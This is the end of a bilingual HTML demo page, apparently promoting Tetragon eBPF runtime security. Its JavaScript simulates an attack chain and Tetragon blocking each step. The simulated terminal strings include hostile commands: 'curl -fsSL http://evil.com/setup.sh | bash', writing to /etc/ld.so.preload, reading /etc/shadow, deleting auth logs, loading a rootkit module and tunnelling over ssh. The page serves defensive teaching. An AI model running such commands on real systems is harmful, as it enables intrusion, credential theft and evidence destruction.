    .conclusion-grid { 
        display: grid; 
        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
        gap: 40px; 
        max-width: 1000px; 
        margin: 0 auto; 
    }
    .conclusion-item { 
        background: rgba(255,255,255,0.08); 
        padding: 35px; 
        border-radius: 16px; 
        border: 1px solid rgba(255,255,255,0.15); 
    }
    .conclusion-item strong { 
        color: var(--cisco-blue); 
        display: block; 
        margin-bottom: 15px; 
        font-size: 1.25rem; 
    }
    .conclusion-item p { 
        color: #FFFFFF !important; 
        font-size: 1.05rem; 
        margin-bottom: 0; 
        opacity: 0.95;
        line-height: 1.6;
    }
</style>
<section class="final-conclusion">
    <div class="container">
        <h2>
            <span lang="zh">æ€»ç»“ä¸æ ¸å¿ƒè§è§£</span><span lang="en">Conclusion & Core Insights</span>
        </h2>
        <div class="conclusion-core">
            <span lang="zh">Tetragon çš„æ ¸å¿ƒä»·å€¼åœ¨äºå°†å®‰å…¨ä»â€œè¢«åŠ¨é˜²å¾¡â€è½¬å˜ä¸ºâ€œåŸºäºé¢„æœŸè¡Œä¸ºçš„ä¸»åŠ¨ç­–ç•¥â€ã€‚</span><span lang="en">Tetragon's core value lies in transforming security from "passive defense" to "proactive, behavior-based policies."</span>
        </div>

        <div style="max-width: 800px; margin: 0 auto 40px; background: rgba(255,255,255,0.05); padding: 30px; border-radius: 16px; border: 1px dashed rgba(255,255,255,0.2);">
            <h4 style="color: var(--cisco-blue); text-align: center; margin-bottom: 20px;">
                <span lang="zh">ğŸ”‘ å…³é”®ç»“è®º (Key Takeaways)</span><span lang="en">ğŸ”‘ Key Takeaways</span>
            </h4>
            <ul style="color: white; font-size: 0.95rem; padding-left: 20px; line-height: 1.8;">
                <li>
                    <strong><span lang="zh">åŒæ­¥æ¯”å¼‚æ­¥æ›´å®‰å…¨ï¼š</span><span lang="en">Sync is Safer than Async:</span></strong>
                    <span lang="zh">åœ¨å†…æ ¸æ€å®Œæˆ Syscall é˜»æ–­æ˜¯æœç» 0-day é€ƒé€¸çš„å”¯ä¸€æ‰‹æ®µã€‚</span><span lang="en">In-kernel syscall blocking is the only way to prevent 0-day escapes.</span>
                </li>
                <li>
                    <strong><span lang="zh">èº«ä»½æ¯” IP æ›´å¯é ï¼š</span><span lang="en">Identity over IP:</span></strong>
                    <span lang="zh">Kubernetes åŸç”Ÿå…ƒæ•°æ®æ˜ å°„æ¶ˆé™¤äº†åŠ¨æ€åŸºç¡€è®¾æ–½ä¸­çš„å®¡è®¡ç›²åŒºã€‚</span><span lang="en">Native Kubernetes metadata mapping eliminates audit blind spots in dynamic infra.</span>
                </li>
                <li>
                    <strong><span lang="zh">æç®€æ¯”å¤æ‚æ›´ç¨³å¥ï¼š</span><span lang="en">Simple is Robust:</span></strong>
                    <span lang="zh">eBPF éªŒè¯å™¨ç¡®ä¿äº†é˜²å¾¡é€»è¾‘ä¸ä¼šæ‹–å®ä¸šåŠ¡æ€§èƒ½ã€‚</span><span lang="en">The eBPF Verifier ensures security logic never compromises performance.</span>
                </li>
            </ul>
        </div>

        <div class="conclusion-grid">
            <div class="conclusion-item">
                <strong><span lang="zh">å†…æ ¸æ€å¼ºåˆ¶æ‰§è¡Œ</span><span lang="en">In-Kernel Enforcement</span></strong>
                <p>
                    <span lang="zh">åˆ©ç”¨ eBPF çš„é«˜æ€§èƒ½é’©å­ï¼Œåœ¨ç³»ç»Ÿè°ƒç”¨å±‚é¢å®ç°äºšæ¯«ç§’çº§çš„é˜²å¾¡å“åº”ï¼Œç¡®ä¿åœ¨æ¶æ„æ“ä½œå‘ç”Ÿå‰å³åˆ»é˜»æ–­ã€‚</span><span lang="en">Utilizing eBPF's high-performance hooks for sub-millisecond defense at the syscall level, ensuring immediate blocking before malicious acts.</span>
                </p>
            </div>
            <div class="conclusion-item">
                <strong><span lang="zh">é›¶ä¿¡ä»»è¿è¡Œæ—¶</span><span lang="en">Zero-Trust Runtime</span></strong>
                <p>
                    <span lang="zh">ä¸å‡è®¾ä»»ä½•è¿›ç¨‹æ˜¯å®‰å…¨çš„ã€‚é€šè¿‡æ·±å±‚ä¸Šä¸‹æ–‡æ„ŸçŸ¥ï¼ˆç”¨æˆ·ã€äºŒè¿›åˆ¶è·¯å¾„ã€å‘½åç©ºé—´ï¼‰ï¼Œä»…å…è®¸ç™½åå•å†…çš„åˆæ³•æ“ä½œã€‚</span><span lang="en">Assuming no process is safe. Through deep context awareness (user, binary, namespace), it only allows legitimate white-listed operations.</span>
                </p>
            </div>
            <div class="conclusion-item">
                <strong><span lang="zh">æä½æ€§èƒ½æŸè€—</span><span lang="en">Minimal Performance Loss</span></strong>
                <p>
                    <span lang="zh">åœ¨å†…æ ¸ç©ºé—´å®Œæˆè¿‡æ»¤ï¼Œè§„é¿äº†æ˜‚è´µçš„ä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€ï¼Œç¡®ä¿ä¸ºé«˜æ€§èƒ½ç”Ÿäº§ä¸šåŠ¡æä¾›åšå¦‚å¤¯å®çš„ä¿æŠ¤ã€‚</span><span lang="en">Filtering in kernel space avoids expensive context switching, providing robust protection for high-performance production workloads.</span>
                </p>
            </div>
        </div>

        <div style="margin-top: 50px; padding: 20px; border-top: 1px solid rgba(255,255,255,0.1); text-align: center;">
            <p style="font-size: 1.2rem; font-weight: 600; color: var(--cisco-blue);">
                <span lang="zh">æœ€åä¸€å¥è¯ï¼šå¦‚æœå®‰å…¨ä¸èƒ½å®æ—¶ï¼Œé‚£å®ƒåªæ˜¯å–è¯ã€‚</span><span lang="en">Final Thought: If security isn't real-time, it's just forensics.</span>
            </p>
        </div>

        <div style="text-align: center; margin-top: 40px;">
            <p style="color: #61C6E2; font-weight: bold; font-size: 1.1rem;">
                <span lang="zh">å‡†å¤‡å¥½æ„å»ºä½ çš„å†…æ ¸çº§é˜²çº¿äº†å—ï¼Ÿ</span><span lang="en">Ready to build your kernel-level defense?</span>
            </p>
            <button class="btn-primary" onclick="scrollToId('lab-section')" style="background: var(--white); color: var(--cisco-midnight); border: none; padding: 16px 40px; border-radius: 30px; font-weight: 700; cursor: pointer; margin-top: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
                <span lang="zh">ç«‹å³å¯åŠ¨å®éªŒå®¤æ¼”ç»ƒ</span><span lang="en">Launch Lab Training Now</span>
            </button>
        </div>
    </div>
</section>
<section class="reference-section">
    <div class="container">
        <div class="view-title">
            <span lang="zh">å‚è€ƒèµ„æ–™ä¸æŠ€æœ¯æ–‡çŒ®</span>
            <span lang="en">References & Technical Literature</span>
        </div>
        
        <ul class="reference-list">
            <li class="reference-item">
                <a href="https://www.ciscolive.com/c/dam/r/ciscolive/global-event/docs/2025/pdf/BRKSEC-2167.pdf" target="_blank">
                    Cisco Live 2025: BRKSEC-2167 - eBPF-Powered Security Architecture (PDF)
                </a>
            </li>

            <li class="reference-item">
                <a href="https://tetragon.io/docs/overview/" target="_blank">Tetragon Documentation: Overview</a>
            </li>
            <li class="reference-item">
                <a href="https://tetragon.io/docs/getting-started/" target="_blank">Tetragon Documentation: Getting Started Guide</a>
            </li>
            <li class="reference-item">
                <a href="https://tetragon.io/docs/concepts/" target="_blank">Tetragon Documentation: Core Concepts</a>
            </li>
            <li class="reference-item">
                <a href="https://tetragon.io/docs/use-cases/" target="_blank">Tetragon Documentation: Security Use Cases</a>
            </li>

            <li class="reference-item">
                <a href="https://docs.google.com/presentation/d/1jNJ0pPkHjvv4QN_K01FGbNLaWD5gqgbwxCNAehn4PBQ/" target="_blank">
                    Tetragon Architecture Deep Dive & Performance Analysis (Google Slides)
                </a>
            </li>

            <li class="reference-item">
                <a href="https://isovalent.com/products/runtime-security/" target="_blank">
                    Isovalent Runtime Security: Enterprise-grade eBPF Enforcement
                </a>
            </li>
            <li class="reference-item">
                <a href="https://isovalent.com/blog/post/what-is-runtime-security/" target="_blank">
                    Isovalent Blog: What is Runtime Security?
                </a>
            </li>
            <li class="reference-item">
                <a href="https://isovalent.com/blog/post/isovalent-runtime-security-118/" target="_blank">
                    Isovalent Blog: Runtime Security 1.18 - Enhanced Prevention
                </a>
            </li>
            <li class="reference-item">
                <a href="https://isovalent.com/blog/post/isovalent-runtime-security-116/" target="_blank">
                    Isovalent Blog: Runtime Security 1.16 - Performance & Scalability
                </a>
            </li>
            <li class="reference-item">
                <a href="https://isovalent.com/blog/post/isovalent-splunk-better-together/" target="_blank">
                    Isovalent Blog: Tetragon and Splunk - Building a Real-time SOC
                </a>
            </li>
            <li class="reference-item">
                <a href="https://isovalent.com/blog/post/top-tetragon-use-cases/" target="_blank">
                    Isovalent Blog: Top Tetragon Use Cases (Part 1)
                </a>
            </li>
            <li class="reference-item">
                <a href="https://isovalent.com/blog/post/top-tetragon-use-cases-part-2/" target="_blank">
                    Isovalent Blog: Top Tetragon Use Cases (Part 2)
                </a>
            </li>
            <li class="reference-item">
                <a href="https://cilium.io/blog/2025/12/31/tetragon-2025-review/" target="_blank">
                    Tetragon 2025 Year in Review: AI-powered Policies and Dynamic SBOM Integration.
                </a>
            </li>
            <li class="reference-item">
                <a href="https://cilium.io/blog/2025/11/4/process-tetragon/" target="_blank">
                    Deep Dive into Process Tetragon: In-kernel Lifecycle Tracking and Performance Aggregation.
                </a>
            </li>
        </ul>
    </div>
</section>
<footer>
    <div class="container" style="text-align: center; color: #999; font-size: 0.9rem; padding: 40px 0;">
        <p>&copy; 2025 Cisco Security Insight. Powered by eBPF & Tetragon.</p>
    </div>
</footer>

    </main>

    <script>
        /**
         * è¯­è¨€åˆ‡æ¢æ ¸å¿ƒé€»è¾‘
         */
        function setLanguage(lang) {
            document.body.className = 'lang-' + lang;
            localStorage.setItem('tetragon-lang', lang);
        }

        // åˆå§‹åŒ–è¯­è¨€è®¾ç½®
        window.addEventListener('DOMContentLoaded', () => {
            const savedLang = localStorage.getItem('tetragon-lang') || 'zh';
            setLanguage(savedLang);
        });

        /**
         * åŸå§‹å¹³æ»‘æ»šåŠ¨é€»è¾‘
         */
        function scrollToId(id) {
            const el = document.getElementById(id);
            if (el) el.scrollIntoView({ behavior: 'smooth' });
        }

        // Case Zero: Dark-Chain æ”»å‡»æ¨¡æ‹Ÿé€»è¾‘
        const dcScenarios = {
            1: [
                { type: 'cmd', text: 'ssh -i secret_backdoor victim@my-dear-customer' },
                { type: 'out', text: '[*] Backdoor signature match. Exploiting IFUNC redirection...' },
                { type: 'highlight', text: 'root@my-dear-customer:~# (Initial Access SUCCESS)' }
            ],
            2: [
                { type: 'cmd', text: 'insmod dark_chain_rk.ko' },
                { type: 'out', text: '[*] Hooking sys_call_table. Modifying getdents64...' },
                { type: 'highlight', text: '(Rootkit active - Malware is now INVISIBLE to ps/top)' }
            ],
            3: [
                { type: 'cmd', text: 'cat /etc/shadow' },
                { type: 'out', text: 'root:$6$vE9...:19842:0:99999:7:::' },
                { type: 'highlight', text: '[!] 5,000,000 user hash seeds successfully captured.' }
            ],
            4: [
                { type: 'cmd', text: 'rm -rf /var/log/auth.log && touch /var/log/auth.log' },
                { type: 'out', text: '[*] Indicators of Compromise (IoC) purged from disk.' },
                { type: 'highlight', text: '[*] Anti-Forensics: Wiping log traces complete.' }
            ],
            5: [
                { type: 'cmd', text: 'ssh internal-db-01' },
                { type: 'out', text: '[*] Pivoting to Production Database...' },
                { type: 'highlight', text: 'SYSTEM ENCRYPTED. RANSOM: 50 BTC. Mission Complete.' }
            ]
        };

        // æ‰“å­—æœºæ•ˆæœå‡½æ•° (ç»´æŒåŸçŠ¶)
        async function typeWriter(text, element, speed = 30) {
            for (let char of text) {
                element.innerHTML += char;
                await new Promise(r => setTimeout(r, speed));
            }
        }

        // æ”»å‡»æ¨¡æ‹Ÿæ‰§è¡Œå‡½æ•° (ç»´æŒåŸçŠ¶)
        async function runDarkChainStep(id) {
            // åˆ‡æ¢æŒ‰é’®çŠ¶æ€
            document.querySelectorAll('.attack-stage-btn').forEach(b => b.classList.remove('active'));
            const activeBtn = document.getElementById(`dc-btn-${id}`);
            if (activeBtn) activeBtn.classList.add('active');

            const logEl = document.getElementById('dc-log');
            logEl.innerHTML = "";

            // éå†æ‰§è¡Œåœºæ™¯è¡Œ
            for (let lineObj of dcScenarios[id]) {
                const line = document.createElement('div');
                if (lineObj.type === 'cmd') {
                    line.innerHTML = `<span class="term-cmd">attacker@kali:~$ </span>`;
                }

                const content = document.createElement('span');
                content.className = lineObj.type === 'highlight' ? 'term-highlight' : 'term-out';
                line.appendChild(content);
                logEl.appendChild(line);

                await typeWriter(lineObj.text, content, 15);
                logEl.appendChild(document.createElement('br'));
            }
            logEl.scrollTop = logEl.scrollHeight;
        }

        async function startDiscovery() {
            const btn = document.getElementById('discover-btn');
            const yaml = document.getElementById('generated-yaml');
            const empty = document.getElementById('empty-policy-text');
            const status = document.getElementById('discovery-status');
            const msg = document.getElementById('discovery-msg');
            const hint = document.getElementById('sync-hint');
            
            // è·å–å½“å‰è¯­è¨€
            const isEn = document.body.classList.contains('lang-en');

            btn.disabled = true;
            status.innerText = isEn ? "Analyzing log stream..." : "åˆ†ææ—¥å¿—æµä¸­...";
            
            document.querySelectorAll('.log-line.highlight').forEach(l => {
                l.style.backgroundColor = 'rgba(108, 194, 74, 0.2)';
            });
            
            await new Promise(r => setTimeout(r, 1500));
            if (empty) empty.style.display = 'none';
            if (yaml) {
                yaml.style.display = 'block';
                yaml.classList.add('yaml-transfer');
            }
            status.innerHTML = `<b style='color:var(--cisco-green)'>${isEn ? "Policy Extracted" : "ç­–ç•¥æå–æˆåŠŸ"}</b>`;
            if (msg) msg.style.display = 'block';
            if (hint) hint.style.display = 'block';
            
            // è‡ªåŠ¨æ»šåŠ¨é€»è¾‘ä¿æŒ
            setTimeout(() => {
                const labEl = document.getElementById('lab-section');
                if(labEl) labEl.scrollIntoView({ behavior: 'smooth' });
            }, 2500);
        }

        // --- å…¨å±€çŠ¶æ€ç®¡ç† ---
        let setupMode = 'k8s';

        // --- å®éªŒç¯å¢ƒé‡ç½®ä¸çŠ¶æ€åˆ‡æ¢ ---
        function resetTerminal(targetId) {
            const el = document.getElementById(targetId);
            if (!el) return;

            const isSetup = targetId === 'setupOutput';
            const prompt = isSetup ? 'admin@infra:~$ ' : 'root@prod-db:~# ';
            const info = isSetup ? 'Infrastructure Console Initialized...' : 'Last login: Today from 192.168.1.5';
            
            el.innerHTML = `<div class="login-info">${info}</div><div><span class="prompt">${prompt}</span><span class="cursor"></span></div>`;
            el.scrollTop = 0;

            const wrap = el.closest('.terminal');
            if (wrap) wrap.classList.remove('shield-active');

            // æ›´æ–°çŠ¶æ€æ ‡ç­¾
            const idMatch = targetId.match(/\d+/);
            const statusIdx = isSetup ? '0' : (idMatch ? idMatch[0] : null);
            if (statusIdx) {
                const statusLabel = document.getElementById(`status-${statusIdx}`);
                if (statusLabel) {
                    statusLabel.classList.remove('active');
                    statusLabel.querySelector('.status-text').innerText = 'MODE: MONITORING';
                }
            }
        }

        function activateShield(id) {
            const statusLabel = document.getElementById(`status-${id}`);
            if (statusLabel) {
                statusLabel.classList.add('active');
                statusLabel.querySelector('.status-text').innerText = 'MODE: ENFORCING';
            }
        }

        function triggerShieldEffect(wrapId) {
            const wrap = document.getElementById(wrapId);
            if (wrap) {
                wrap.classList.add('shield-active');
                setTimeout(() => wrap.classList.remove('shield-active'), 1200);
            }
        }

        // --- åœºæ™¯ 0: Tetragon éƒ¨ç½²æ¨¡æ‹Ÿ ---
        function switchSetupTab(mode) {
            setupMode = mode;
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            document.getElementById(`btn-tab-${mode}`).classList.add('active');
            document.querySelectorAll('.setup-detail').forEach(el => el.style.display = 'none');
            document.getElementById(`setup-${mode}`).style.display = 'block';
            resetTerminal('setupOutput');
        }

async function runSetupSimulation() {
    const btn = document.getElementById('setupBtn');
    const termContent = document.getElementById('setupOutput');
    btn.disabled = true;
    resetTerminal('setupOutput');

    const createPromptLine = (path = 'admin@infra:~$ ') => {
        const div = document.createElement('div');
        div.innerHTML = `<span class="prompt">${path}</span><span class="cmd-text"></span>`;
        termContent.appendChild(div);
        return div.querySelector('.cmd-text');
    };

    const addOutput = (text, color = '#ADBAC7', marginTop = '2px') => {
        const div = document.createElement('div');
        div.className = "terminal-output-line";
        div.style.color = color;
        div.style.marginTop = marginTop;
        div.innerHTML = text;
        termContent.appendChild(div);
        termContent.scrollTop = termContent.scrollHeight;
    };

        // éšè—åˆå§‹çš„å…‰æ ‡
        const firstPrompt = termContent.querySelector('div:last-child');
        if (firstPrompt) firstPrompt.style.display = 'none';

        if (setupMode === 'k8s') {
            // --- [Scenario K8S]: å®Œæ•´ Helm éƒ¨ç½²æµç¨‹ ---
            
            // 1. Add Repo
            let cmd = createPromptLine();
            await typeWriter('helm repo add cilium https://helm.cilium.io', cmd);
            await new Promise(r => setTimeout(r, 600));
            addOutput('"cilium" has been added to your repositories', 'var(--cisco-green)');

            // 2. Repo Update
            cmd = createPromptLine();
            await typeWriter('helm repo update', cmd);
            await new Promise(r => setTimeout(r, 800));
            addOutput('Hang tight while we grab the latest from your chart repositories...');
            addOutput('...Successfully got an update from the "cilium" chart repository');

            // 3. Helm Install
            cmd = createPromptLine();
            await typeWriter('helm install tetragon cilium/tetragon -n kube-system', cmd);
            await new Promise(r => setTimeout(r, 1200));
            addOutput('NAME: tetragon', '#888');
            addOutput('LAST DEPLOYED: ' + new Date().toLocaleString(), '#888');
            addOutput('NAMESPACE: kube-system', '#888');
            addOutput('STATUS: deployed', 'var(--cisco-green)');

            // 4. Rollout Status
            cmd = createPromptLine();
            await typeWriter('kubectl rollout status -n kube-system ds/tetragon -w', cmd);
            addOutput('waiting for daemon set "tetragon" rollout to finish...', '#888');
            await new Promise(r => setTimeout(r, 1500));
            addOutput('daemon set "tetragon" successfully rolled out', 'var(--cisco-green)');

        } else {
            // --- [Scenario Linux]: å®Œæ•´äºŒè¿›åˆ¶å®‰è£…æµç¨‹ ---
            
            // 1. Download
            let cmd = createPromptLine();
            await typeWriter('curl -LO https://github.com/cilium/tetragon/releases/download/v1.6.0/tetragon-v1.6.0-amd64.tar.gz', cmd);
            await new Promise(r => setTimeout(r, 500));
            addOutput('  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current');
            addOutput('100 28.4M  100 28.4M    0     0  14.2M      0  0:00:02  0:00:02 --:--:-- 14.2M', '#888');

            // 2. Extract
            cmd = createPromptLine();
            await typeWriter('tar -xvf tetragon-v1.6.0-amd64.tar.gz', cmd);
            await new Promise(r => setTimeout(r, 600));
            addOutput('tetragon-v1.6.0-amd64/');
            addOutput('tetragon-v1.6.0-amd64/tetragon');
            addOutput('tetragon-v1.6.0-amd64/install.sh');

            // 3. CD
            cmd = createPromptLine();
            await typeWriter('cd tetragon-v1.6.0-amd64/', cmd);
            await new Promise(r => setTimeout(r, 400));

            // 4. Install (Change Prompt Path)
            cmd = createPromptLine('admin@infra:~/tetragon-v1.6.0-amd64$ ');
            await typeWriter('sudo ./install.sh', cmd);
            await new Promise(r => setTimeout(r, 1000));
            addOutput('Tetragon installed successfully!', 'var(--cisco-green)', '10px');
            addOutput('Tetragon started. Kernel hooks active.', 'var(--cisco-green)');
        }

        // æ¿€æ´»çŠ¶æ€ç¯
        activateShield('0');
        
        // æ¢å¤æœ€ç»ˆå…‰æ ‡
        const finalPath = setupMode === 'k8s' ? 'admin@infra:~$ ' : 'admin@infra:~/tetragon-v1.6.0-amd64$ ';
        const lastLine = document.createElement('div');
        lastLine.innerHTML = `<span class="prompt">${finalPath}</span><span class="cursor"></span>`;
        termContent.appendChild(lastLine);
        
        termContent.scrollTop = termContent.scrollHeight;
        btn.disabled = false;
    }

        // --- Case Zero: æ”»å‡»æ¼”ç¤ºé€»è¾‘ (Dark-Chain Attacker) ---
        async function runDarkChainStep(id) {
            document.querySelectorAll('.attack-stage-btn').forEach(b => b.classList.remove('active'));
            const activeBtn = document.getElementById(`dc-btn-${id}`);
            if (activeBtn) activeBtn.classList.add('active');
            
            const logEl = document.getElementById('dc-log');
            logEl.innerHTML = "";
            
            for(let lineObj of dcScenarios[id]) {
                const line = document.createElement('div');
                if(lineObj.type === 'cmd') line.innerHTML = `<span class="term-cmd">attacker@kali:~$ </span>`;
                const content = document.createElement('span');
                content.className = lineObj.type === 'highlight' ? 'term-highlight' : 'term-out';
                line.appendChild(content);
                logEl.appendChild(line);
                
                await typeWriter(lineObj.text, content, 15);
                logEl.appendChild(document.createElement('br'));
            }
            logEl.scrollTop = logEl.scrollHeight;
        }

        // --- æ”»é˜²æ¼”ç»ƒå®éªŒå®¤: æ ¸å¿ƒé€»è¾‘ (Phase 1-5 é˜²å¾¡ä¾§) ---
        async function runLabPhase(id) {
            const btn = document.getElementById(`labBtn${id}`);
            const termContent = document.getElementById(`labOut${id}`);
            const wrapId = `term-wrap-${id}`;
            if (!btn || !termContent) return;

            btn.disabled = true;
            resetTerminal(`labOut${id}`);
            activateShield(id);

            const firstPrompt = termContent.lastElementChild;
            firstPrompt.querySelector('.cursor').style.display = 'none';
            let cmdSpan = document.createElement('span');
            cmdSpan.className = "cmd-text";
            firstPrompt.appendChild(cmdSpan);

            if (id === 1) { // åˆå§‹è®¿é—®é˜²æŠ¤
                await typeWriter('ssh attacker@prod-db -p 22', cmdSpan);
                await new Promise(r => setTimeout(r, 800));
                termContent.innerHTML += `<div class="output-text" style="color: #61C6E2;">> Backdoor signature match. Exploiting IFUNC...</div>`;
                termContent.innerHTML += `<div class="output-text" style="color: var(--cisco-orange);">[Tetragon] âš ï¸ Intercepting abnormal sshd behavior: Attempting to forge a shell</div>`;
                triggerShieldEffect(wrapId);
                termContent.innerHTML += `<div style="margin: 8px 0;"><span class="alert-text">KILL</span> <span style="color: #FF5F56;">SIGKILL was sent to the child process (PID 3012). The attack was blocked.</span></div>`;
                termContent.innerHTML += `<div class="json-log-view">JSON Log: {"policy": "block-sshd-fork", "action": "sigkill", "source": "sshd", "target": "/bin/sh"}</div>`;
            } 
            else if (id === 2) { // æŒä¹…åŒ–é˜²æŠ¤ (ç”¨æˆ·æŒ‡å®šæ¨¡æ‹Ÿ)
                await typeWriter('curl -fsSL http://evil.com/setup.sh | bash', cmdSpan);
                await new Promise(r => setTimeout(r, 600));
                termContent.innerHTML += `<div class="output-text" style="color: #61C6E2;">> Connecting evil.com...</div>`;
                termContent.innerHTML += `<div class="output-text" style="color: var(--cisco-orange);">[Tetragon] âš ï¸ Suspicious network connection detected (curl -> evil.com:80)</div>`;
                await new Promise(r => setTimeout(r, 1000));
                
                termContent.innerHTML += `<div><span class="prompt">root@prod-db:~# </span><span class="cmd-text" id="phase2-cmd2"></span></div>`;
                await typeWriter('echo "root_kit" >> /etc/ld.so.preload', document.getElementById('phase2-cmd2'));
                triggerShieldEffect(wrapId);
                termContent.innerHTML += `<div style="margin: 8px 0;"><span class="alert-text">BLOCK</span> <span style="color: #FF5F56;">The process 'bash' (pid=1402) has been terminated by SIGKILL.</span></div>`;
                termContent.innerHTML += `<div class="json-log-view">JSON Log: {"policy": "protect-system-files", "action": "sigkill", "syscall": "openat", "file": "/etc/ld.so.preload"}</div>`;
            }
            else if (id === 3) { // å‡­æ®è·å–é˜²æŠ¤
                await typeWriter('cat /etc/shadow', cmdSpan);
                await new Promise(r => setTimeout(r, 600));
                triggerShieldEffect(wrapId);
                termContent.innerHTML += `<div style="margin: 8px 0;"><span class="alert-text">DENIED</span> <span style="color: #FF5F56;">LSM policies prevent access to sensitive system files.</span></div>`;
                termContent.innerHTML += `<div class="json-log-view">JSON Log: {"policy": "shadow-file-protect", "action": "sigkill", "syscall": "openat", "file": "/etc/shadow"}</div>`;
            }
            else if (id === 4) { // é˜²å¾¡é€ƒé€¸é˜²æŠ¤
                await typeWriter('rm -rf /var/log/auth.log', cmdSpan);
                await new Promise(r => setTimeout(r, 600));
                triggerShieldEffect(wrapId);
                termContent.innerHTML += `<div style="margin: 8px 0;"><span class="alert-text">PREVENTED</span> <span style="color: #FF5F56;">Kernel-level audit protection: Prevent deletion of critical authentication logs.</span></div>`;
                termContent.innerHTML += `<div class="json-log-view">JSON Log: {"policy": "log-integrity-shield", "action": "sigkill", "syscall": "unlinkat", "target": "auth.log"}</div>`;
            }
            else if (id === 5) { // æ¨ªå‘ç§»åŠ¨é˜²æŠ¤
                await typeWriter('ssh internal-db-01 -L 5432:localhost:5432', cmdSpan);
                await new Promise(r => setTimeout(r, 800));
                termContent.innerHTML += `<div class="output-text" style="color: #61C6E2;">> Attempting to establish an illegal network tunnel...</div>`;
                triggerShieldEffect(wrapId);
                termContent.innerHTML += `<div style="margin: 8px 0;"><span class="alert-text">REJECTED</span> <span style="color: #FF5F56;">Unauthorized lateral movement on the intranet was detected. The socket connection has been forcibly terminated.</span></div>`;
                termContent.innerHTML += `<div class="json-log-view">JSON Log: {"policy": "zero-trust-network", "action": "sigkill", "syscall": "connect", "dest": "10.0.0.50"}</div>`;
            }

            termContent.innerHTML += `<div><span class="prompt">root@prod-db:~# </span><span class="cursor"></span></div>`;
            termContent.scrollTop = termContent.scrollHeight;
            btn.disabled = false;
        }

        // --- ç­–ç•¥å‘ç°æ¼”ç¤ºé€»è¾‘ ---
        async function startDiscovery() {
            const btn = document.getElementById('discover-btn');
            const yaml = document.getElementById('generated-yaml');
            const empty = document.getElementById('empty-policy-text');
            const status = document.getElementById('discovery-status');
            const msg = document.getElementById('discovery-msg');
            const hint = document.getElementById('sync-hint');
            
            btn.disabled = true;
            status.innerText = "Analyzing the log stream...";
            document.querySelectorAll('.log-line.highlight').forEach(l => l.style.backgroundColor = 'rgba(108, 194, 74, 0.2)');
            
            await new Promise(r => setTimeout(r, 1500));
            if (empty) empty.style.display = 'none';
            if (yaml) {
                yaml.style.display = 'block';
                yaml.classList.add('yaml-transfer');
            }
            status.innerHTML = "<b style='color:var(--cisco-green)'>Strategy extraction successful</b>";
            if (msg) msg.style.display = 'block';
            if (hint) hint.style.display = 'block';
            
            setTimeout(() => scrollToId('lab-section'), 2500);
        }
    </script>
</body>

</html>